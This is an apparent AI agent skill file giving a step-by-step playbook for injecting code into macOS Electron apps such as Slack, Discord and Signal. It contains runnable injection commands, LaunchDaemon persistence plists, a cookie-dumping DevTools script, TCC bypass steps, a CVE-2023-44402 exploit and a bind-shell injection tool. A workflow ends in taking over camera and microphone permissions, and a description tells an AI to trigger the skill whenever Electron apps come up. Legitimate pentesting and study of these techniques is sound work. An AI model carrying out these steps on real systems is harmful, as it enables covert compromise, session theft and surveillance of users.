---
name: macos-electron-injection
description: macOS Electron application security testing and privilege escalation. Use this skill whenever the user mentions Electron apps, macOS security testing, privilege escalation on macOS, Electron fuses, code injection in desktop apps, or any Electron-based application like Slack, Discord, VS Code, Signal, etc. This skill covers checking Electron fuses, various RCE techniques (ELECTRON_RUN_AS_NODE, NODE_OPTIONS, --inspect), persistence via plist, TCC bypass methods, and CVE exploitation. Trigger this for any macOS Electron security assessment, pentest, or privilege escalation scenario.
---

# macOS Electron Applications Injection

A comprehensive guide for security testing Electron applications on macOS, covering fuse analysis, code injection techniques, persistence mechanisms, and privilege escalation.

## Quick Start

```bash
# Check if an Electron app has vulnerable fuses
npx @electron/fuses read --app /Applications/Slack.app

# List all installed Electron apps
find /Applications -name "*.app" -exec grep -l "Electron" {} \; 2>/dev/null
```

## Understanding Electron Fuses

Electron Fuses are security flags that prevent code injection. Check them first before attempting any technique.

### Critical Fuses

| Fuse | When Disabled | When Enabled |
|------|---------------|--------------|
| `RunAsNode` | Allows `ELECTRON_RUN_AS_NODE` injection | Blocks Node.js mode |
| `EnableNodeCliInspectArguments` | Allows `--inspect`, `--inspect-brk` | Blocks debug flags |
| `EnableEmbeddedAsarIntegrityValidation` | ASAR files not validated | ASAR integrity checked |
| `OnlyLoadAppFromAsar` | Can load from `app/` folder | Only loads `app.asar` |
| `EnableNodeOptionsEnvironmentVariable` | Allows `NODE_OPTIONS` | Blocks NODE_OPTIONS |

### Check Fuses

```bash
# Using official tool
npx @electron/fuses read --app /Applications/Slack.app

# Manual check - find the fuse string in binary
grep -R "dL7pKGdnNz796PbbjQWNKmHXBZaB9tsX" /Applications/Slack.app/
```

The fuse configuration is stored in the Electron binary, typically at:
```
application.app/Contents/Frameworks/Electron Framework.framework/Electron Framework
```

## Injection Techniques

### Technique 1: ELECTRON_RUN_AS_NODE

**Requires:** `RunAsNode` fuse disabled

```bash
# Launch as Node.js process
ELECTRON_RUN_AS_NODE=1 /Applications/Discord.app/Contents/MacOS/Discord

# Then in the Node.js console:
require('child_process').execSync('/bin/bash -c "whoami"')
```

**Persistence via LaunchDaemon:**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.electron.inject</string>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>-e</string>
        <string>require('child_process').execSync('YOUR_PAYLOAD')</string>
    </array>
    <key>EnvironmentVariables</key>
    <dict>
        <key>ELECTRON_RUN_AS_NODE</key>
        <string>true</string>
    </dict>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
```

### Technique 2: NODE_OPTIONS

**Requires:** `EnableNodeOptionsEnvironmentVariable` disabled OR `ELECTRON_RUN_AS_NODE=1` set

```bash
# Create payload file
cat > /tmp/payload.js << 'EOF'
require('child_process').execSync('YOUR_COMMAND');
EOF

# Execute with NODE_OPTIONS
NODE_OPTIONS="--require /tmp/payload.js" \
ELECTRON_RUN_AS_NODE=1 \
/Applications/Discord.app/Contents/MacOS/Discord
```

**Persistence via LaunchDaemon:**

```xml
<dict>
    <key>EnvironmentVariables</key>
    <dict>
        <key>ELECTRON_RUN_AS_NODE</key>
        <string>true</string>
        <key>NODE_OPTIONS</key>
        <string>--require /tmp/payload.js</string>
    </dict>
    <key>Label</key>
    <string>com.electron.nodeoptions</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

### Technique 3: Debug Port Injection

**Requires:** `EnableNodeCliInspectArguments` disabled OR `ELECTRON_RUN_AS_NODE=1` set

```bash
# Launch with debug port
/Applications/Signal.app/Contents/MacOS/Signal --inspect=9229

# Or use remote debugging port
/Applications/Signal.app/Contents/MacOS/Signal --remote-debugging-port=9229
```

**Connect via Chrome DevTools:**
1. Open `chrome://inspect`
2. Connect to `127.0.0.1:9229`
3. Execute JavaScript in console:
```javascript
require('child_process').execSync('YOUR_COMMAND')
```

**Cookie Dumping Script:**

```python
import websocket

ws = websocket.WebSocket()
ws.connect("ws://localhost:9229/devtools/page/85976D59050BFEFDBA48204E3D865D00", suppress_origin=True)
ws.send('{"id": 1, "method": "Network.getAllCookies"}')
print(ws.recv())
```

**Persistence via LaunchDaemon:**

```xml
<dict>
    <key>ProgramArguments</key>
    <array>
        <string>/Applications/Slack.app/Contents/MacOS/Slack</string>
        <string>--inspect</string>
    </array>
    <key>Label</key>
    <string>com.electron.inspect</string>
    <key>RunAtLoad</key>
    <true/>
</dict>
```

### Technique 4: ASAR File Modification

**Requires:** `OnlyLoadAppFromAsar` disabled OR `EnableEmbeddedAsarIntegrityValidation` disabled

```bash
# Extract ASAR file
npx asar extract /Applications/Slack.app/Contents/Resources/app.asar /tmp/app-decomp

# Modify files in /tmp/app-decomp
# Add malicious code to main.js or preload.js

# Repack ASAR
npx asar pack /tmp/app-decomp /tmp/app-new.asar

# Replace (requires TCC permissions or copy to /tmp)
cp /tmp/app-new.asar /Applications/Slack.app/Contents/Resources/app.asar
```

**TCC Bypass Method:**

```bash
# Copy app to /tmp to bypass TCC check
cp -r /Applications/Slack.app /tmp/Slack.app

# Rename Contents folder temporarily
mv /tmp/Slack.app/Contents /tmp/Slack.app/NotCon

# Modify ASAR file
cd /tmp/Slack.app/NotCon/Resources
npx asar extract app.asar app-decomp
# ... modify files ...
npx asar pack app-decomp app.asar

# Restore folder name
mv /tmp/Slack.app/NotCon /tmp/Slack.app/Contents

# Execute from /tmp
/tmp/Slack.app/Contents/MacOS/Slack
```

## TCC Bypass Techniques

### Method 1: Older Version Abuse

The TCC daemon doesn't check the executed version. Download an older version of the app and inject code - it will still have TCC privileges.

```bash
# Download older version from archive
# Inject code into older version
# Execute - inherits TCC permissions from original
```

### Method 2: Child Process Inheritance

Child processes run under the same sandbox profile and inherit TCC permissions:

```javascript
// From within Electron process
const { spawn } = require('child_process');
spawn('/path/to/binary', [], {
  stdio: 'inherit'
});
// This binary inherits camera/microphone permissions
```

## Known Vulnerabilities

### CVE-2023-44402 - ASAR Integrity Bypass

**Affected:** Electron ≤22.3.23, various 23-27 pre-releases

**Exploit:** Create a directory named `app.asar` instead of archive:

```bash
# In Contents/Resources/
mkdir app.asar
# Place malicious JS files inside
# App will load directory instead of validated archive
```

**Patched in:** 22.3.24, 24.8.3, 25.8.1, 26.2.1, 27.0.0-alpha.7

### CVE-2024-23738 to CVE-2024-23743 - RunAsNode Cluster

Many Electron apps ship with `RunAsNode` and `EnableNodeCliInspectArguments` fuses enabled, allowing local attackers to:
- Relaunch with `ELECTRON_RUN_AS_NODE=1`
- Use `--inspect-brk` for code injection
- Inherit all sandbox and TCC permissions

**Mitigation:** Disable these fuses in production builds.

## Automated Tools

### electroniz3r

```bash
# List all Electron apps
./electroniz3r list-apps

# Check if app is vulnerable
./electroniz3r verify "/Applications/Discord.app"

# Inject predefined payload
./electroniz3r inject "/Applications/Discord.app" --predefined-script bindShell

# Custom payload
./electroniz3r inject "/Applications/Discord.app" --script /path/to/payload.js
```

### Loki

Backdoors Electron applications by replacing JavaScript files with C2 files.

## Workflow Checklist

1. **Identify Electron Apps**
   ```bash
   find /Applications -name "*.app" -type d
   ```

2. **Check Fuses**
   ```bash
   npx @electron/fuses read --app /Applications/Target.app
   ```

3. **Select Technique Based on Fuses**
   - `RunAsNode` disabled → Use `ELECTRON_RUN_AS_NODE`
   - `EnableNodeCliInspectArguments` disabled → Use `--inspect`
   - `OnlyLoadAppFromAsar` disabled → Modify ASAR
   - All fuses enabled → Try TCC bypass or older version

4. **Execute Injection**
   - Use appropriate technique from above
   - Verify code execution

5. **Establish Persistence** (if needed)
   - Create LaunchDaemon plist
   - Place in `~/Library/LaunchDaemons/` or `/Library/LaunchDaemons/`

6. **Leverage TCC Permissions**
   - Access camera, microphone, contacts, etc.
   - Run binaries that inherit permissions

## Common Electron Applications

| App | Bundle ID | Path |
|-----|-----------|------|
| Slack | com.tinyspeck.slackmacgap | /Applications/Slack.app |
| Discord | com.hnc.Discord | /Applications/Discord.app |
| VS Code | com.microsoft.VSCode | /Applications/Visual Studio Code.app |
| Signal | org.whispersystems.signal-desktop | /Applications/Signal.app |
| Docker | com.electron.dockerdesktop | /Applications/Docker.app |
| GitHub Desktop | com.github.GitHubClient | /Applications/GitHub Desktop.app |
| Postman | com.postmanlabs.mac | /Applications/Postman.app |

## Safety Notes

- **Legal Use Only:** These techniques are for authorized security testing only
- **TCC Permissions:** Modifying apps in `/Applications` requires `kTCCServiceSystemPolicyAppBundles` permission
- **Code Signing:** Modified apps may fail code signature validation
- **Backup:** Always backup original files before modification
- **Testing:** Test in isolated environments before production use

## References

- [Electron Fuses Documentation](https://www.electronjs.org/docs/latest/tutorial/fuses)
- [TrustedSec: macOS Injection via Third-Party Frameworks](https://www.trustedsec.com/blog/macos-injection-via-third-party-frameworks)
- [Electron Security Advisory GHSA-7m48-wc93-9g85](https://github.com/electron/electron/security/advisories/GHSA-7m48-wc93-9g85)
- [WhiteChocolateMacademiaNut](https://github.com/slyd0g/WhiteChocolateMacademiaNut)
- [electroniz3r](https://github.com/r3ggi/electroniz3r)
